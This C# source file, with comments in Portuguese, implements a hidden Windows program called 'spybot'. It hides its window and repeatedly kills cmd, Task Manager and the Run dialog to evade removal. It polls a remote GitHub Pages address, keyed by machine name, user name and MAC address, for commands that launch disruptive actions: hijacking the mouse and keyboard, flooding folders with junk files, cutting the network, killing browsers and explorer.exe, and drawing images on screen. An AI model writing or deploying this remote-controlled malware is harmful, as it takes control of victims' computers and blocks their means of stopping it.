using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace spy
{

    /*
        DATAS:
            0       =   desativado
            1       =   sempre ativo
            data    =   executa na data determinada

        ACOES:
            0       =   Nada, mas mantem o programa aberto
            1       =   Nada, e fecha o programa
            2       =   Mouse loco
            3       =   Poluir o Desktop com arquivos diversos
            4       =   Poluir a pasta Documentos com arquivos diversos
            5       =   Ficar abrindo a calculadora sem parar
            6       =   Ficar abrindo o notepad sem parar
            7       =   Ficar abrindo sites aleatorios sem parar (ver ARRAY_SITES)
            8       =   Ficar digitando palavras aleatorios sem parar obtidas di site
            9       =   Nicolas Cage na tela sem parar 
            10      =   Desativa a internet
            11      =   Desativa a internet ao navegar e ativa ao fechar navegadores 
            12      =   Fecha os navegadores repetidamente
            13      =   Buga o PC, finalizando o EXPLORER.EXE
            14      =   Clica o Mouse em um lugar aleatorio da tela
            15      =   Ficar digitando leetras aleatorias sem parar
     */
    class spybot
    {
        public static string SITE = "https://bresodev.github.io/webtest/SpybotWeb/";

        public static string MEU_MAC = "";
        public static string MEU_NOME = "";
        public static string MEU_NOME_USUARIO = "";
        public static string ACAO = "";
        public static string DATA = "";
        public static string FRASE = "";

        public static bool TUDO_OK = false;
        public static bool FICAR_BUSCANDO_VALORES_NO_SITE = true;
        public static bool FECHAR_CMD = true;
        public static int contador = 0;

        public static int DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE = 15000;
       
        public static string[] ARRAY_EXTENSOES = { ".pdf", ".dll", ".exe", ".txt", ".bin" };
        
        public static string[] ARRAY_PROCESSOS = { "calc.exe", "notepad.exe", "taskmgr.exe", "msedge.exe", "mspaint.exe" };
        
        public static string[] ARRAY_SITES = {
             "https://www.microsoft.com",
            "https://www.google.com",
            "https://www.github.com",
            "https://www.stackoverflow.com",
            "https://www.wikipedia.org",
            "https://www.reddit.com",
            "https://www.linkedin.com",
            "https://www.ted.com",
            "https://www.nasa.gov",
            "https://www.bbc.com",
            "https://www.nytimes.com",
            "https://www.cnn.com",
            "https://www.forbes.com",
            "https://www.imdb.com",
            "https://www.spotify.com",
            "https://www.netflix.com",
            "https://www.twitch.tv",
            "https://www.amazon.com",
            "https://www.ebay.com",
            "https://www.paypal.com"

        };
            public static string[] ARRAY_PALAVRAS;



        //Inicia tudo automaticamente
        public static void inicializar(Form f)
        {
            spybot.finalizarProcesso("cmd");
            spybot.finalizarProcesso("Taskmgr");
            fecharExecutar();

            spybot.obterMAC();
            spybot.obterDadosSite();


            addHook(3000, () =>
            {
                if (VerificarInternet())
                {
                    if (!spybot.TUDO_OK)
                    {
                        if (spybot.ACAO != "")
                        {
                            if (spybot.DATA != "")
                            {
                                spybot.TUDO_OK = true;
                            }
                        }
                        spybot.contador++;
                        if (spybot.contador >= 10)
                        {
                            f.Close();
                        }
                    }
                }


            });

            addHook(DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE, () =>
            {
                if (FICAR_BUSCANDO_VALORES_NO_SITE && spybot.TUDO_OK)
                { 
                    if (VerificarInternet())
                    {
                        spybot.obterDadosSite();
                    }

                }

            });


             

            addHook(100, () =>
            {
                prepararForm(f);
               
                if (FECHAR_CMD)
                {
                    spybot.finalizarProcesso("cmd");
                    spybot.finalizarProcesso("Taskmgr");
                    fecharExecutar();
                }

            });

            //------------------------------------------------------
            int intervalo = 1000;
            System.Windows.Forms.Timer loop = new System.Windows.Forms.Timer();
            loop.Enabled = true;
            loop.Interval = intervalo;
            loop.Start();
            loop.Tick += (a, b) =>
            {
                loop.Interval = intervalo;

                //f.Text = loop.Interval.ToString();
                
                
                if (TUDO_OK && bateuData())
                {
                    if (ACAO == "0")//nada mas mantem aberto
                    {

                    }
                    if (ACAO == "1")//fecha o programa
                    {
                        f.Close();
                    }
                    if (ACAO == "2")//mouse loko
                    {
                        intervalo = 10000;
                        Random r = new Random();
                        Cursor.Position = new Point(r.Next(0, 500), r.Next(0, 500));
                    }
                    if (ACAO == "3")//
                    {
                        intervalo = 5000;
                        PoluirDesktop();
                    }
                    if (ACAO == "4")//
                    {
                        intervalo = 5000;
                        PoluirDocumentos();
                    }
                    if (ACAO == "5")//
                    {
                        intervalo = 1000;
                        Process.Start("calc.exe");
                    }
                    if (ACAO == "6")//
                    {
                        intervalo = 1000;
                        Process.Start("notepad.exe");
                    }
                    if (ACAO == "7")//
                    {
                        intervalo = 5000;
                        Process.Start(arrayAleatorio(ARRAY_SITES));
                    }
                    if (ACAO == "8")//
                    {
                        intervalo = 20000;
                        SendKeys.SendWait(arrayAleatorio(ARRAY_PALAVRAS));
                    }
                    if (ACAO == "9")//
                    {
                        intervalo = 20000;
                        NicolasCage();
                    }
                    if (ACAO == "10")//
                    {
                        cmdRun("ipconfig /release");
                    }
                    if (ACAO == "11")//
                    {
                        intervalo = 10000;
                        if (estaNavegandoInternet())
                        {
                            cmdRun("ipconfig /release");
                        }
                        else
                        {
                            cmdRun("ipconfig /renew");
                        }
                    }
                    if (ACAO == "12")//
                    {
                        intervalo = 10000;
                        fecharNavegadores();
                    }
                    if (ACAO == "13")//
                    {
                        finalizarProcesso("explorer");
                    }
                    if (ACAO == "14")//
                    {
                        intervalo = 5000;
                        clickMouseLugarAleatorio();
                    }
                    if (ACAO == "15")//
                    {
                        intervalo = 30000;
                        SendKeys.SendWait(letraAleatoria()); 
                    }
                }
            };
        }


        public static void prepararForm(Form f)
        {
            f.Size = new Size(0, 0);
            f.Location = new Point(100000, 100000);
            f.ShowInTaskbar = false;
            f.Visible = false;

        }


        public static  void clickMouseLugarAleatorio()
        {
            try
            {
                Random random = new Random();
                int X = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                int Y = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                Cursor.Position = new Point(X, Y);

                INPUT[] inputs = new INPUT[2];
                inputs[0].type = INPUT_MOUSE;
                inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;

                inputs[1].type = INPUT_MOUSE;
                inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;

                SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));

            }
            catch { }
        }

        public static  void cmdRun(string comando)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {comando}", // /C executa o comando e fecha o CMD
                    RedirectStandardOutput = true, // Redireciona a saída para leitura
                    UseShellExecute = false,
                    CreateNoWindow = true // Não exibe a janela do CMD
                };

                // Iniciar o processo
                Process processo = new Process { StartInfo = psi };
                processo.Start();

                // Ler e exibir a saída do comando
                string resultado = processo.StandardOutput.ReadToEnd();
                processo.WaitForExit();
            }
            catch { }

        }

       

        public static void finalizarProcesso(string processoNome = "explorer")
        {
            try
            {
                foreach (Process processo in Process.GetProcessesByName(processoNome))
                {
                    processo.Kill();
                }
            }
            catch { }
        }
        public static void fecharExecutar()
        {
            try
            {
                if (FindWindow(null, "Executar") != IntPtr.Zero)
                {
                    SendMessage(FindWindow(null, "Executar"), 0x0010, IntPtr.Zero, IntPtr.Zero);
                    
                }
                if (FindWindow(null, "Run") != IntPtr.Zero)
                {
                    SendMessage(FindWindow(null, "Run"), 0x0010, IntPtr.Zero, IntPtr.Zero);
                }
            }
            catch { }
        }


        public static  void fecharNavegadores()
        {
            try
            {
                string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave", "iexplore" };

                foreach (string browser in browsers)
                {
                    foreach (Process process in Process.GetProcessesByName(browser))
                    {
                        if (process.ProcessName.Contains(browser))
                        {
                            process.Kill();
                        }
                    }
                }
            }
            catch { }

        }

        public static bool estaNavegandoInternet()
        {
            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave", "iexplore" };

            var runningBrowsers = Process.GetProcesses()
                .Where(p => browsers.Any(b => p.ProcessName.ToLower().Contains(b)))
                .Select(p => p.ProcessName)
                .Distinct()
                .ToList();

            return runningBrowsers.Any();
        }

        public static bool VerificarInternet()
        {
            try
            {
                using (Ping ping = new Ping())
                {
                    PingReply reply = ping.Send("8.8.8.8", 3000); // IP do Google DNS
                    return reply.Status == IPStatus.Success;
                }
            }
            catch
            {
                return false;
            }
        }


        public static void NicolasCage()
        {

            if (!VerificarInternet())
            {
                return;
            }

            string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + spybot.MEU_MAC + ".png";
             
            Random random = new Random();

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    byte[] dados = webClient.DownloadData(url);
                    using (MemoryStream stream = new MemoryStream(dados))
                    {
                        Image imagem = Image.FromStream(stream);

                        IntPtr hdc = spybot.GetDC(IntPtr.Zero); // Obtém o contexto de dispositivo da tela
                        using (Graphics graphics = Graphics.FromHdc(hdc))
                        {
                            int r1 = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                            int r2 = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                            int r3 = random.Next(0, 5);

                            graphics.DrawImage(imagem, r1, r2, imagem.Width / r3, imagem.Height / r3); // Desenha a imagem na posição (100,100)
                        }
                        spybot.ReleaseDC(IntPtr.Zero, hdc); // Libera o contexto de dispositivo

                    }
                }
            }
            catch (Exception ex)
            {
                
            }
        }


        
        static string gerarSenha(int tamanho=5)
        {
            const string caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder senha = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < tamanho; i++)
            {
                int indice = random.Next(caracteres.Length);
                senha.Append(caracteres[indice]);
            }

            return senha.ToString();
        } 

        static string letraAleatoria()
        {
            const string caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
            Random random = new Random();
            int indice = random.Next(caracteres.Length);

            return caracteres[indice].ToString();
        }


        static void PoluirDocumentos()
        {
            try
            {
                Random r = new Random();

                string caminhoArquivo = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/" + r.Next(0, 99999) + "." + arrayAleatorio(ARRAY_EXTENSOES);
                string textoParaAdicionar = FRASE;

                // Usando StreamWriter para criar e escrever no arquivo
                using (StreamWriter writer = new StreamWriter(caminhoArquivo, true))
                {
                    writer.WriteLine(textoParaAdicionar);
                }
            }
            catch { }

        }
        static void PoluirDesktop()
        {
            try
            {
                Random r = new Random();

                string caminhoArquivo = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/" + r.Next(0, 99999) + "." + arrayAleatorio(ARRAY_EXTENSOES);
                string textoParaAdicionar = FRASE;

                // Usando StreamWriter para criar e escrever no arquivo
                using (StreamWriter writer = new StreamWriter(caminhoArquivo, true))
                {
                    writer.WriteLine(textoParaAdicionar);
                }
            }
            catch { }

        }


        static string arrayAleatorio(string[] itens)
        {
            Random random = new Random();
            int indiceAleatorio = random.Next(itens.Length);
            string itemSelecionado = itens[indiceAleatorio];
            return itemSelecionado;
        }




        public static bool bateuData()
        {
            try
            {
                DateTime dataAtual = DateTime.Today;
                if (DATA == dataAtual.ToShortDateString())
                {
                    return true;
                }
                if (DATA == "1")
                {
                    return true;
                }
                return false;
            }
            catch { return false; }
        }

        public static void addHook(int intervalo, Action voidss)
        {
            try
            {
                System.Windows.Forms.Timer loop = new System.Windows.Forms.Timer();
                loop.Enabled = true;
                loop.Interval = intervalo;
                loop.Start();
                loop.Tick += (ccccc, ggggggggg) =>
                {
                    loop.Interval = intervalo;
                    voidss();
                };
            }
            catch { }
        }

        public static async Task obterDadosSite()
        { 

            obterMAC();
            // URL da página que você quer ler
            string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + spybot.MEU_MAC + ".txt";


            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode(); // Lança exceção se não for sucesso
                    string html = await response.Content.ReadAsStringAsync();



                    spybot.MEU_NOME = Environment.MachineName;
                    spybot.MEU_NOME_USUARIO = Environment.UserName;
                    spybot.ACAO = html.Split('|')[0];
                    spybot.DATA = html.Split('|')[1].Replace("\n", "");
                    spybot.FRASE = html.Split('|')[2].Replace("\n", "");
                    spybot.ARRAY_PALAVRAS = html.Split('|')[2].Replace("\n", "").Split(" ");
                    //




                }
                catch (HttpRequestException e)
                {

                }
            }

        }



        public static void obterMAC()
        {
            try
            {
                MEU_MAC = "";

                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        PhysicalAddress macAddress = nic.GetPhysicalAddress();
                        if (macAddress != null && macAddress.GetAddressBytes().Length != 0)
                        {
                            MEU_MAC += macAddress;
                        }
                    }
                }
            }
            catch { }

        }











        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);


        [StructLayout(LayoutKind.Sequential)]
        struct INPUT
        {
            public uint type;
            public MOUSEINPUT mi;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public uint mouseData;
            public uint dwFlags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        private const uint INPUT_MOUSE = 0;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;

        //----------
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr a, uint b, IntPtr c, IntPtr d);

    }
}
/*


Console.WriteLine("Área de trabalho: " + Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
Console.WriteLine("Documentos: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
Console.WriteLine("Aplicativos: " + Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));


 
 */